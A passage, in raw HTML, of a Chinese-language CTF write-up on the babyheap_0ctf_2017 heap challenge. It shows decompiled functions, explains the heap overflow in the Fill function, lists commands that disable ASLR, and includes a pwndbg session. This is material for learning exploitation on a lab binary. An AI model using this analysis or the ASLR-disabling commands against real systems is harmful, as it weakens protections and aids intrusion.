class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  __int64 buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br><br>  buf[<span class="hljs-number">3</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  alarm(<span class="hljs-number">60u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"===== Baby Heap in 2017 ====="</span>);<br>  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);                 <span class="hljs-comment">// 调用系统文件生成随机数</span><br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> || read(fd, buf, <span class="hljs-number">0x10</span>uLL) != <span class="hljs-number">16</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  close(fd);<br>  addr = (<span class="hljs-type">char</span> *)((buf[<span class="hljs-number">0</span>] % <span class="hljs-number">0x555555543000</span>uLL + <span class="hljs-number">0x10000</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>LL);<br>  v3 = (buf[<span class="hljs-number">1</span>] % <span class="hljs-number">0xE80</span>uLL) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL;<br>  <span class="hljs-keyword">if</span> ( mmap(addr, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>) != addr )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">return</span> &amp;addr[v3];                             <span class="hljs-comment">// 利用生成的随机数来生成随机地址</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>​这个函数可以使程序堆块信息存放在随机地址中，而不是固定的地址，因此我们很难通过找到存放堆块信息的地址来修改其地址从而控制程序的流程。<br>​还需要提一句的是，这个函数有alarm函数，从程序运行60秒之后就会终止进程，如果不想在调试程序的时候被打断，可以对二进制文件进行patch。patch之后的可执行文件名为：babyheap_0ctf_2017_patch</p><p>返回的addr 指针 包含了 所有chunk 的 信息和 数据chunk 的指针</p><h3 id="meau-函数"><a href="#meau-函数" class="headerlink" title="meau 函数"></a>meau 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1. Allocate"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2. Fill"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3. Free"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4. Dump"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5. Exit"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Command: "</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>打印菜单</p><h3 id="Alloc-函数"><a href="#Alloc-函数" class="headerlink" title="Alloc 函数"></a>Alloc 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Allocate</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> *calloc_ptr; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !*(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>      size = input();<br>      <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">4096</span> )<br>          size = <span class="hljs-number">4096</span>;<br>        calloc_ptr = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);<br>        <span class="hljs-keyword">if</span> ( !calloc_ptr )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        *(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) = <span class="hljs-number">1</span>;<span class="hljs-comment">//chunk_flag</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">8</span>) = size;<span class="hljs-comment">//chunk_size</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">16</span>) = calloc_ptr;<span class="hljs-comment">//chunk_data_ptr 指向calloc出来的chunk_data</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Allocate Index %d\n"</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i);<br>      }<br>      <span class="hljs-keyword">return</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>传入的参数地址是get_addr 随机生成的地址。allocate函数是来创建堆块的，申请chunk最大的大小为4096。</p><p>首先输入堆块的content_size，然后调用calloc函数根据输入的content_size大小来创建堆块，最后堆块的信息保存在get_addr指针所指向的地址中。需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为\x00。<br>请注意，堆块的index是从0开始的<br>因此程序的结构体为：</p><blockquote><p>●chunk_flag:用来判断堆块是否存在<br>●chunk_content_size:#记录content的大小<br>●chunk_data_ptr:指向calloc出来的chunk_data</p></blockquote><h3 id="Fill-函数"><a href="#Fill-函数" class="headerlink" title="Fill 函数"></a>Fill 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Fill</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<span class="hljs-comment">//判断序号是否正确，判断flag为 chunk 是否存在</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>    v2 = input();<span class="hljs-comment">//又让输出size，改写 chunk 数据部分的内容,存在溢出!!</span><br>    <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0</span> )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content: "</span>);<br>      read_func2(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), v2); <span class="hljs-comment">//*(_QWORD *)(24LL * v1 + a1 + 16) == chunk_data</span><br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>上图是Fill函数分伪代码，这个函数的功能比较有意思，漏洞也是存在这个函数中的。<br>在填充内容的功能中，调用input函数来输入堆块的大小，并没有设置字符串结尾。而且比较有意思的是，这次又让我们重新输入了content_size，但是程序并没有将原来结构体中的content_size更改。且执行这个函数之后allocate chunk时堆块的size域没有改变，所以这里就出现了任意堆溢出的情形。</p><h3 id="Free-函数"><a href="#Free-函数" class="headerlink" title="Free 函数"></a>Free 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Free</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) = <span class="hljs-number">0</span>;<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>) = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>));<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>) = <span class="hljs-number">0LL</span>;     <span class="hljs-comment">// 指针置空</span><br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>输入序号，释放chunk。将 flag 字段，size 字段清0，free了数据chunk的指针同时也清0，不存在uaf</p><h3 id="Dump-函数"><a href="#Dump-函数" class="headerlink" title="Dump 函数"></a>Dump 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Dump</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Content: "</span>);<br>    write_func(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">puts</span>(byte_14F1);<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>输入序号，打印内容</p><h2 id="gdb-动态调试"><a href="#gdb-动态调试" class="headerlink" title="gdb 动态调试"></a>gdb 动态调试</h2><p>还记得之前get_addr这个函数吗？这个函数主要使用来生成随机地址，其中指针也存放在哪里。</p><h3 id="关闭ASLR保护"><a href="#关闭ASLR保护" class="headerlink" title="关闭ASLR保护"></a>关闭ASLR保护</h3><p>由于这个程序开启了PIE保护，为了方便调试程序及查看堆内存，因此我们将Linux的ALSR(地址空间随机化)进行关闭。首先看一下ALSR开启的状态，可以使用下面的任意其中一种命令</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space<br><span class="hljs-number">2</span><br>ubuntu@ubuntu:~$ sysctl -a --pattern randomize<br>kernel.randomize_va_space = <span class="hljs-number">2</span><br>ubuntu@ubuntu:~$<br><br>###<br><span class="hljs-number">0</span> = 关闭<br><span class="hljs-number">1</span> = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（PIE也会影响heap的随机化）<br><span class="hljs-number">2</span> = 全随机。除了<span class="hljs-number">1</span>中所述，还有heap。<br>###<br></code></pre></td></tr></tbody></table></figure><p>现在关闭ASLR，关闭方法如下：<br><strong>方法一： 手动修改randomize_va_space文件</strong><br>上面介绍的randomize_va_space文件的枚举值含义，设置的值不同，linux内核加载程序的地址空间的策略就会不同。比较简单明了。这里0代表关闭ASLR。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-number">0</span> &gt; /proc/sys/kernel/randomize_va_space<br>#注意，这里是先进root权限，后执行。<br>#重启之后会恢复默认<br></code></pre></td></tr></tbody></table></figure><p><strong>方法二： 使用sysctl控制ASLR</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sysctl -w kernel.randomize_va_space=<span class="hljs-number">0</span><br>#重启之后将恢复默认<br>#如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。<br></code></pre></td></tr></tbody></table></figure><p><strong>方法三： 使用setarch控制单个程序的随机化</strong><br>如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">setarch `uname -m` -R ./your_program<br>#-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)<br></code></pre></td></tr></tbody></table></figure><p><strong>方法四： 在GDB场景下，使用set disable-randomization off</strong><br>在调试特定程序时，可以通过set disable-randomization命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。<br>当然，这里开启，关闭和查看的方法看起来就比较正规了。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">关闭ASLR：<br><span class="hljs-built_in">set</span> disable-randomization on<br>开启ASLR：<br><span class="hljs-built_in">set</span> disable-randomization off<br>查看ASLR状态：<br>show disable-randomization<br></code></pre></td></tr></tbody></table></figure><p>我们如何找到那个随机地址呢？通过多次对程序gdb调试，发现了一直变化的地址（此时的ASLR已关闭，参见下文章下面的内容），下面的代码框之中是两次gdb调试的内存分布：</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png'><img src="https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png" alt="Snipaste_2023-09-13_15-53-21.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png'><img src="https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png" alt="Snipaste_2023-09-13_15-54-08.png"></p><p>通过对比发现，变动的只有第一行的地址：</p><p>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    0x40729d6e2000     0x40729d6e3000 rw-p     1000 0 </p><p>​    0x2dd727226000     0x2dd727227000 rw-p     1000 0 </p><p>到这里，可以猜测一下，程序的指针应该也存放在这片内存区域中。<br>我们重新gdb调试，通过执行函数Allocate和fill，来看一下这片内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0c<br>tf_2017$ gdb babyheap_0ctf_2017<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from babyheap_0ctf_2017...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017 <br>===== Baby Heap in <span class="hljs-number">2017</span> =====<br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">1</span><br>Size: <span class="hljs-number">20</span><br>Allocate Index <span class="hljs-number">0</span><br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">2</span><br>Index: <span class="hljs-number">0</span><br>Size: <span class="hljs-number">40</span><br>Content: aaaaaaaaaaaaaaaaaa<br>^C<br>Program received signal SIGINT, Interrupt.<br><span class="hljs-number">0x00007ffff7b04360</span> in __read_nocancel () at ../sysdeps/unix/syscall-template.S:<span class="hljs-number">84</span><br><span class="hljs-number">84</span>../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────<br> RAX  <span class="hljs-number">0xfffffffffffffe00</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x15</span><br> RDI  <span class="hljs-number">0x0</span><br> RSI  <span class="hljs-number">0x555555757023</span> ◂— <span class="hljs-number">0x20fe10000000000</span><br> R8   <span class="hljs-number">0x7ffff7fdd700</span> ◂— <span class="hljs-number">0x7ffff7fdd700</span><br> R9   <span class="hljs-number">0x9</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x555555554a40</span> ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffdd50</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdc20</span> —▸ <span class="hljs-number">0x7fffffffdc50</span> —▸ <span class="hljs-number">0x7fffffffdc70</span> —▸ <span class="hljs-number">0x5555555553e0</span> ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdbf8</span> —▸ <span class="hljs-number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br> RIP  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br>────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────<br> ► <span class="hljs-number">0x7ffff7b04360</span> &lt;__read_nocancel+<span class="hljs-number">7</span>&gt;     cmp    rax, <span class="hljs-number">-0xfff</span><br>   <span class="hljs-number">0x7ffff7b04366</span> &lt;__read_nocancel+<span class="hljs-number">13</span>&gt;    jae    read+<span class="hljs-number">73</span> &lt;<span class="hljs-number">0x7ffff7b04399</span>&gt;<br>    ↓<br>   <span class="hljs-number">0x7ffff7b04399</span> &lt;read+<span class="hljs-number">73</span>&gt;               mov    rcx, qword ptr [rip + <span class="hljs-number">0x2ccad8</span>]<br>   <span class="hljs-number">0x7ffff7b043a0</span> &lt;read+<span class="hljs-number">80</span>&gt;               neg    eax<br>   <span class="hljs-number">0x7ffff7b043a2</span> &lt;read+<span class="hljs-number">82</span>&gt;               mov    dword ptr fs:[rcx], eax<br>   <span class="hljs-number">0x7ffff7b043a5</span> &lt;read+<span class="hljs-number">85</span>&gt;               or     rax, <span class="hljs-number">0xffffffffffffffff</span><br>   <span class="hljs-number">0x7ffff7b043a9</span> &lt;read+<span class="hljs-number">89</span>&gt;               ret    <br> <br>   <span class="hljs-number">0x7ffff7b043aa</span>                         nop    word ptr [rax + rax]<br>   <span class="hljs-number">0x7ffff7b043b0</span> &lt;write&gt;                 cmp    dword ptr [rip + <span class="hljs-number">0x2d2389</span>], <span class="hljs-number">0</span> &lt;<span class="hljs-number">0x7ffff7dd6740</span>&gt;<br>   <span class="hljs-number">0x7ffff7b043b7</span> &lt;write+<span class="hljs-number">7</span>&gt;               jne    write+<span class="hljs-number">25</span> &lt;<span class="hljs-number">0x7ffff7b043c9</span>&gt;<br>    ↓<br>   <span class="hljs-number">0x7ffff7b043c9</span> &lt;write+<span class="hljs-number">25</span>&gt;              sub    rsp, <span class="hljs-number">8</span><br>─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdbf8</span> —▸ <span class="hljs-number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdc00</span> ◂— <span class="hljs-number">0x28</span> <span class="hljs-comment">/* '(' */</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdc08</span> —▸ <span class="hljs-number">0x555555757010</span> ◂— <span class="hljs-number">0x6161616161616161</span> (<span class="hljs-string">'aaaaaaaa'</span>)<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdc10</span> ◂— <span class="hljs-number">0x13</span><br>... ↓<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│ rbp  <span class="hljs-number">0x7fffffffdc20</span> —▸ <span class="hljs-number">0x7fffffffdc50</span> —▸ <span class="hljs-number">0x7fffffffdc70</span> —▸ <span class="hljs-number">0x5555555553e0</span> ◂— push   r15<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdc28</span> —▸ <span class="hljs-number">0x555555554f48</span> ◂— jmp    <span class="hljs-number">0x555555554f4e</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdc30</span> ◂— <span class="hljs-number">0x0</span><br>───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>     <span class="hljs-number">7f</span>fff7b04360 __read_nocancel+<span class="hljs-number">7</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">5555555551f</span>d<br>   f <span class="hljs-number">2</span>     <span class="hljs-number">555555554f</span>48<br>   f <span class="hljs-number">3</span>     <span class="hljs-number">555555555188</span><br>   f <span class="hljs-number">4</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>Program received signal SIGINT<br>pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x3b0326206000</span>     <span class="hljs-number">0x3b0326207000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x555555554000</span>     <span class="hljs-number">0x555555556000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555755000</span>     <span class="hljs-number">0x555555756000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555756000</span>     <span class="hljs-number">0x555555757000</span> rw-p     <span 